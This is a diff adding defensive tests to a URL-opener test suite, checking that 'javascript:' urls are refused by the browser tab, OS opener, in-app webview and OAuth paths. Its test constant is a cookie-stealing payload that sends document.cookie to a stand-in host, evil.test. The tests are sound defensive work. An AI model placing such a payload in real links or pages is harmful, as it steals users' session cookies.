@@ -187,4 +187,65 @@ describe('openUrl / openUrlOutsideApp: system browser vs in-app webview routing'
 
     expect(toasts.value[0].message).toContain('(requested by thread "Weekly report")');
   });
+
+  // A scripted url must die at the opener, not at one ingress. The deep-link
+  // parser screened it; an agent `navigate_ui` over SSE, a notification-toast
+  // tap and a notification inbox-row tap all reached here unscreened. Each of
+  // the three destinations below is a separate sink, so each gets its own case.
+  describe('a scripted scheme reaches none of the three sinks', () => {
+    const SCRIPTED = 'javascript:fetch("https://evil.test/"+document.cookie)';
+
+    it('non-Tauri: no tab, and the refusal is visible', () => {
+      platformMocks.isTauri = false;
+
+      openUrl(SCRIPTED);
+
+      expect(window.open).not.toHaveBeenCalled();
+      expect(window.location.href).toBe(APP_URL);
+      expect(toasts.value).toHaveLength(1);
+      expect(toasts.value[0].message).toContain('Refused to open a scripted url');
+    });
+
+    it('Tauri + toggle off: never reaches the OS opener', () => {
+      platformMocks.isTauri = true;
+      preferences.value = { status: 'loaded', data: {} };
+
+      openUrl(SCRIPTED);
+
+      expect(openExternal).not.toHaveBeenCalled();
+      expect(panelOverlay.value).toBeNull();
+    });
+
+    it('Tauri + toggle on: never reaches the in-app webview', () => {
+      platformMocks.isTauri = true;
+      preferences.value = { status: 'loaded', data: { experimental_in_app_browser: 'true' } };
+
+      openUrl(SCRIPTED);
+
+      expect(panelOverlay.value).toBeNull();
+      expect(webviewInitialUrl.value).toBeNull();
+      expect(pushNavState).not.toHaveBeenCalled();
+      expect(revealContentPane).not.toHaveBeenCalled();
+    });
+
+    it('openUrlOutsideApp is guarded too, since OAuth calls it directly', () => {
+      platformMocks.isTauri = true;
+      preferences.value = { status: 'loaded', data: { experimental_in_app_browser: 'true' } };
+
+      openUrlOutsideApp(SCRIPTED, 'thread "Read my email"');
+
+      expect(openExternal).not.toHaveBeenCalled();
+      expect(window.open).not.toHaveBeenCalled();
+      expect(toasts.value[0].message).toContain('(requested by thread "Read my email")');
+    });
+
+    it('an ordinary https url still opens, so the guard is not a blanket refusal', () => {
+      platformMocks.isTauri = false;
+
+      openUrl(TARGET_URL);
+
+      expect(window.open).toHaveBeenCalledWith(TARGET_URL, '_blank');
+      expect(toasts.value).toEqual([]);
+    });
+  });
 });
